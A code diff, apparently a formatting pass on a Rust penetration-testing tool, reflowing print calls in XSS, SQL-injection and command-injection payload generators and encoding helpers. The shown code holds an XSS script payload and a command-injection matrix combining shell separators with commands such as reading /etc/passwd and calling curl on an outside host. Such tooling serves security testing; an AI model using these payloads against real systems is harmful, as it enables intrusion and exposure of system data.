@@ -1,5 +1,5 @@
-use colored::Colorize;
 use base64::{Engine as _, engine::general_purpose};
+use colored::Colorize;
 
 const XSS_PAYLOADS: &[&str] = &[
     "<script>alert(1)</script>",
@@ -83,10 +83,18 @@ pub async fn xss(_context: &str) -> anyhow::Result<()> {
     println!("\n{} Encoded variants:", "[*]".cyan().bold());
     let test = XSS_PAYLOADS[0];
     println!("  {} URL:      {}", "*".cyan(), url_encode(test));
-    println!("  {} Base64:   {}", "*".cyan(), general_purpose::STANDARD.encode(test));
+    println!(
+        "  {} Base64:   {}",
+        "*".cyan(),
+        general_purpose::STANDARD.encode(test)
+    );
     println!("  {} Hex:      {}", "*".cyan(), hex_encode(test));
     println!("  {} Unicode:  {}", "*".cyan(), unicode_encode(test));
-    println!("  {} Double:   {}", "*".cyan(), url_encode(&url_encode(test)));
+    println!(
+        "  {} Double:   {}",
+        "*".cyan(),
+        url_encode(&url_encode(test))
+    );
     println!("  {} HTML:     {}", "*".cyan(), html_encode(test));
     Ok(())
 }
@@ -113,21 +121,40 @@ pub async fn sqli(_context: &str) -> anyhow::Result<()> {
         }
     }
 
-    println!("\n{} Encoded variants of '{}':", "[*]".cyan().bold(), SQLI_PAYLOADS[0]);
+    println!(
+        "\n{} Encoded variants of '{}':",
+        "[*]".cyan().bold(),
+        SQLI_PAYLOADS[0]
+    );
     println!("  {} URL:    {}", "*".cyan(), url_encode(SQLI_PAYLOADS[0]));
-    println!("  {} Base64: {}", "*".cyan(), general_purpose::STANDARD.encode(SQLI_PAYLOADS[0]));
+    println!(
+        "  {} Base64: {}",
+        "*".cyan(),
+        general_purpose::STANDARD.encode(SQLI_PAYLOADS[0])
+    );
     println!("  {} Hex:    {}", "*".cyan(), hex_encode(SQLI_PAYLOADS[0]));
     Ok(())
 }
 
 pub async fn cmdi(_context: &str) -> anyhow::Result<()> {
-    println!("{} Command Injection Payload Generator", "[*]".cyan().bold());
+    println!(
+        "{} Command Injection Payload Generator",
+        "[*]".cyan().bold()
+    );
     println!("{}", "=".repeat(60).cyan());
     println!("{} {} payloads", "[*]".cyan().bold(), CMDI_PAYLOADS.len());
     println!("{}", "-".repeat(60).dimmed());
 
     let separators = [";", "|", "&&", "||", "$()", "``"];
-    let commands = ["id", "whoami", "cat /etc/passwd", "ls -la", "uname -a", "ifconfig", "curl http://test.example.com"];
+    let commands = [
+        "id",
+        "whoami",
+        "cat /etc/passwd",
+        "ls -la",
+        "uname -a",
+        "ifconfig",
+        "curl http://test.example.com",
+    ];
 
     println!("{} Separator matrix:", "[*]".cyan().bold());
     for sep in &separators {
@@ -151,7 +178,11 @@ pub async fn cmdi(_context: &str) -> anyhow::Result<()> {
     println!("\n{} Encoded variants:", "[*]".cyan().bold());
     let test = CMDI_PAYLOADS[0];
     println!("  {} URL:      {}", "*".cyan(), url_encode(test));
-    println!("  {} Base64:   {}", "*".cyan(), general_purpose::STANDARD.encode(test));
+    println!(
+        "  {} Base64:   {}",
+        "*".cyan(),
+        general_purpose::STANDARD.encode(test)
+    );
     println!("  {} Hex:      {}", "*".cyan(), hex_encode(test));
     println!("  {} Unicode:  {}", "*".cyan(), unicode_encode(test));
     Ok(())
@@ -167,16 +198,36 @@ pub async fn encode(input: &str, enc_type: &str) -> anyhow::Result<()> {
     match enc_type {
         "all" | "ALL" => {
             println!("  {} URL:       {}", "*".cyan(), url_encode(input));
-            println!("  {} URL (double): {}", "*".cyan(), url_encode(&url_encode(input)));
-            println!("  {} Base64:    {}", "*".cyan(), general_purpose::STANDARD.encode(input));
-            println!("  {} Base64 (URL-safe): {}", "*".cyan(), general_purpose::URL_SAFE.encode(input));
+            println!(
+                "  {} URL (double): {}",
+                "*".cyan(),
+                url_encode(&url_encode(input))
+            );
+            println!(
+                "  {} Base64:    {}",
+                "*".cyan(),
+                general_purpose::STANDARD.encode(input)
+            );
+            println!(
+                "  {} Base64 (URL-safe): {}",
+                "*".cyan(),
+                general_purpose::URL_SAFE.encode(input)
+            );
             println!("  {} Hex:       {}", "*".cyan(), hex_encode(input));
             println!("  {} Unicode:   {}", "*".cyan(), unicode_encode(input));
             println!("  {} HTML:      {}", "*".cyan(), html_encode(input));
-            println!("  {} HTML (decimal): {}", "*".cyan(), html_decimal_encode(input));
+            println!(
+                "  {} HTML (decimal): {}",
+                "*".cyan(),
+                html_decimal_encode(input)
+            );
         }
         "url" | "URL" => println!("  {} {}", "*".cyan(), url_encode(input)),
-        "base64" | "BASE64" => println!("  {} {}", "*".cyan(), general_purpose::STANDARD.encode(input)),
+        "base64" | "BASE64" => println!(
+            "  {} {}",
+            "*".cyan(),
+            general_purpose::STANDARD.encode(input)
+        ),
         "hex" | "HEX" => println!("  {} {}", "*".cyan(), hex_encode(input)),
         "unicode" | "UNICODE" => println!("  {} {}", "*".cyan(), unicode_encode(input)),
         "html" | "HTML" => println!("  {} {}", "*".cyan(), html_encode(input)),
@@ -200,24 +251,35 @@ fn url_encode(s: &str) -> String {
 }
 
 fn hex_encode(s: &str) -> String {
-    s.bytes().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join("")
+    s.bytes()
+        .map(|b| format!("{:02x}", b))
+        .collect::<Vec<_>>()
+        .join("")
 }
 
 fn unicode_encode(s: &str) -> String {
-    s.chars().map(|c| format!("\\u{:04x}", c as u32)).collect::<Vec<_>>().join("")
+    s.chars()
+        .map(|c| format!("\\u{:04x}", c as u32))
+        .collect::<Vec<_>>()
+        .join("")
 }
 
 fn html_encode(s: &str) -> String {
-    s.chars().map(|c| match c {
-        '<' => "&lt;".to_string(),
-        '>' => "&gt;".to_string(),
-        '"' => "&quot;".to_string(),
-        '\'' => "&#x27;".to_string(),
-        '&' => "&amp;".to_string(),
-        _ => c.to_string(),
-    }).collect()
+    s.chars()
+        .map(|c| match c {
+            '<' => "&lt;".to_string(),
+            '>' => "&gt;".to_string(),
+            '"' => "&quot;".to_string(),
+            '\'' => "&#x27;".to_string(),
+            '&' => "&amp;".to_string(),
+            _ => c.to_string(),
+        })
+        .collect()
 }
 
 fn html_decimal_encode(s: &str) -> String {
-    s.chars().map(|c| format!("&#{};", c as u32)).collect::<Vec<_>>().join("")
+    s.chars()
+        .map(|c| format!("&#{};", c as u32))
+        .collect::<Vec<_>>()
+        .join("")
 }
